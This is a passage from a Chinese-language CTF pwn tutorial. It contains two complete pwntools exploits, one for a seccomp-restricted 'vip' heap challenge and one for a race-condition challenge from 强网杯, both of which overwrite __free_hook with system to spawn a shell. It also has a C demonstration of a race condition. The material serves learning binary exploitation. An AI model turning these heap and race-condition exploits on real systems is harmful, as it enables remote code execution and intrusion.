    A=args[1]
    A==0x40207e ? next:ok
    return ERRNO(0)
    ok:
    return ALLOW
    //将规则转成字符形式
    seccomp-tools asm 文件名.asm
    //转成汇编代码
    seccomp-tools asm 文件名.asm -f assembly
    //转成C语言代码
    seccomp-tools asm 44.asm -f c_source
    //将规则转成结构体形式
    seccomp-tools asm 文件名.asm -f raw | seccomp-tools disasm -    
当然还有disasm和emu功能~自己去探索吧
有个规则，写入即可，接着我们就可以任意溢出了，这里overlap创造出unsorted
bin，泄露出真实地址，这里直接修改FD为free_hook，直接打system即可getshell
exp：
    #coding=utf8
    from pwn import *
    context.log_level = 'debug'
    context(arch='amd64', os='linux')
    local = 1
    elf = ELF('./vip')
    if local:
        p = process('./vip')
        libc = elf.libc
    else:
        p = remote('112.126.103.14',9999)
        libc = ELF('./libc-2.27.so')
    sl = lambda s : p.sendline(s)
    sd = lambda s : p.send(s)
    rc = lambda n : p.recv(n)
    ru = lambda s : p.recvuntil(s)
    ti = lambda : p.interactive()
    def debug(addr,PIE=True):
        if PIE:
            text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
            gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
        else:
            gdb.attach(p,"b *{}".format(hex(addr)))
    def bk(addr):
        gdb.attach(p,"b *"+str(hex(addr)))
    def edit(index,size,content):
        ru("Your choice: ")
        sl('4')
        ru("Index: ")
        sl(str(index))
        ru("Size: ")
        sl(str(size))
        ru("Content: ")
        sd(content)
    def free(index):
        ru("Your choice: ")
        sl('3')
        ru("Index: ")
        sl(str(index))
    def malloc(index):
        ru("Your choice: ")
        sl('1')
        ru("Index: ")
        sl(str(index))
    def puts(index):
        ru("Your choice: ")
        sl('2')
        ru("Index: ")
        sl(str(index))
    def vip(py):
        ru("Your choice: ")
        sl('6')
        ru("OK, but before you become vip, please tell us your name: ")
        sd(py)
    for i in range(13):
        malloc(i)
    py = 'a'*0x20 + " \x00\x00\x00\x00\x00\x00\x00\x15\x00\x00\x03\x01\x01\x00\x00 \x00\x00\x00\x18\x00\x00\x00\x15\x00\x00\x01~ @\x00\x06\x00\x00\x00\x00\x00\x05\x00\x06\x00\x00\x00\x00\x00\xFF\x7F"
    vip(py)
    py = ''
    py += 'a'*0x50
    py += p64(0) + p64(0x421)
    edit(0, 0x60, py)
    free(1)
    malloc(12)
    puts(12)
    malloc_hook = u64(rc(6).ljust(8,'\x00')) -1104 -0x10
    libc_base = malloc_hook - libc.symbols['__malloc_hook']
    system = libc_base + libc.symbols['system']
    free_hook = libc_base + libc.symbols["__free_hook"]
    onegadget = libc_base + 0x10a38c
    print "malloc_hook--->" + hex(malloc_hook)
    free(5)
    py = ''
    py += 'a'*0x50
    py += p64(0) + p64(61)
    py += p64(free_hook)
    edit(4,0x70,py)
    malloc(13)
    malloc(14)
    edit(14, 0x20, p64(system))
    edit(7,0x20,'/bin/sh\x00')
    free(7)
    p.interactive()
### 三、竞争条件
#### 1、概念前言
​
这里打CTF第一次遇到这种题目，也积累下知识和经验，首先理解下条件竞争的含义和概念。竞争条件是系统中的一种反常现象，由于现代Linux系统中大量使用并发编程，对资源进行共享，如果产生错误的访问模式，便可能产生内存泄露，系统崩溃，数据破坏，甚至安全问题。竞争条件漏洞就是多个进程访问同一资源时产生的时间或者序列的冲突，并利用这个冲突来对系统进行攻击。一个看起来无害的程序如果被恶意攻击者利用，将发生竞争条件漏洞。
#### 2、理解和加深
纸上谈来终觉浅，我们用代码和图像来直接理解：
    #include   
    #include   
    #include 
    int i = 1;  
    void *mythread1()  
    {   
        if(i == 1){                 
          sleep(3);
          if(i == 2)              
              printf("hack it!\n");
          else
              printf("try again!\n");
        }  
    }  
    void *mythread2()  
    {  
        sleep(1);
        i=2;      
    }  
    int main(int argc, const char *argv[])  
    {    
        pthread_t id1,id2;  
        pthread_create(&id1, NULL, (void *)mythread1,NULL);  
        pthread_create(&id2, NULL, (void *)mythread2,NULL);  
        pthread_join(id1,NULL);  
        pthread_join(id2,NULL);  
        return 0;
    }
程序逻辑很简单，创建2个线程，然后第一个睡了3s后再继续执行，第二个睡了1s就继续执行，这里就是很明显的竞争条件，id2会趁着id1睡着时去改i的数据，这样就会回显出hack
it(正常不发生竞争条件的话，是回显try again)。不理解的话，我们再用图像来解释：
理解完了什么是条件竞争，在CTF的比赛中，pwn方向也会出现这样的题目，这里就实战总结下。
#### 3、实战总结
题目：强网杯pwn1
保护全开，然后给了个2.27的库（tcache攻击），直接分析ida：
熟悉的菜单题，3个功能，下面一个个分析：
1、malloc
正常的申请，idx下标没有检查，意味着有负数的机会(一个漏洞点)，申请的堆块是0xA0的固定大小，内容也是申请的0xA0的大小，内容就在堆块本身，所以chunk的结构就出来了：
struct chunk{
int size；
string string；
}
再看看free函数：
这里对idx进行了检查，同时没有UAF的漏洞（null置为了0）
最后看下神秘的run函数：
看到了线程创建，猜想有可能是竞争条件或者TLS攻击的栈溢出，进去看看
功能就是输入key作为堆块内容异或加密的值，然后输出异或加密的内容，主要注意到sleep(3)，这是一个很明显的提示（竞争条件）意味着run函数执行到一半，sleep了，然后后面的函数会先执行，之后再回来执行睡醒的run函数，写个代码理解下：
    malloc(0,'AAAAAAAA') 1
    run(0,key) 3
    free(0) 2
很清晰可以看到执行顺序为1,3,2。知道了这个漏洞接下来的事情就好办了，思路马上有了：
1、先泄露出真实地址(异或0得到本身），因为申请的堆块刚好是unsortd bin 大小
2、利用条件竞争先free再在FD中伪造fake_chunk为free_hook
3、申请2次，改free_hook为system，free掉一个有/bin/sh\x00的堆块既可getshell
上exp:
    #coding=utf8
    from pwn import *
    context.log_level = 'debug'
    context(arch='amd64', os='linux')
    local = 1
    elf = ELF('./pwn1')
    if local:
        p = process('./pwn1')
        libc = elf.libc
    else:
        p = remote('116.85.48.105',5005)
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    sl = lambda s : p.sendline(s)
    sd = lambda s : p.send(s)
    rc = lambda n : p.recv(n)
    ru = lambda s : p.recvuntil(s)
    ti = lambda : p.interactive()
    def debug(addr,PIE=True):
        if PIE:
            text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
            gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
        else:
            gdb.attach(p,"b *{}".format(hex(addr)))
    def bk(addr):
        gdb.attach(p,"b *"+str(hex(addr)))
    def malloc(index,content,flag=1):
        if flag:
            ru("3.run")
        sl('1')
        ru("index:")
        sl(str(index))
        ru("content:")
        sd(content)
    def free(index):
        ru("3.run")
        sl('2')
        ru("index:")
        sl(str(index))
    def fun(index,key):
        ru("3.run")
        sl('3')
        ru("index:")
        sl(str(index))
        ru("input key:")
        sl(str(key))
    for i in range(10):
        malloc(i,'/bin/sh\x00')
    for i in range(7):
        free(i)
    free(7)
    for k in range(7):
        malloc(k,'/bin/sh\x00')
    malloc(10,'aaaaaaaa')
    fun(10,0)
    ru("aaaaaaaa")
    malloc_hook = u64(rc(6).ljust(8,'\x00')) - 96 - 0x10
    print "malloc-->" + hex(malloc_hook)
    libc_base = malloc_hook - libc.symbols['__malloc_hook']
    free_hook = libc_base + libc.symbols['__free_hook']
    system = libc_base + libc.symbols["system"]
    ru("done")
    sl('2')
    ru("index:")
    sl('8')
    malloc(11,'\x00'*8)
    fun(11,free_hook)
    free(11)
    ru('done')
    #接收到done表示3s过去了，run执行完了
    malloc(11,'/bin/sh\x00',0)
    malloc(12,p64(system))
    free(11)
    p.interactive()
getsehll:  
### 四、IO_File结构体与攻击方法
(待更新.......)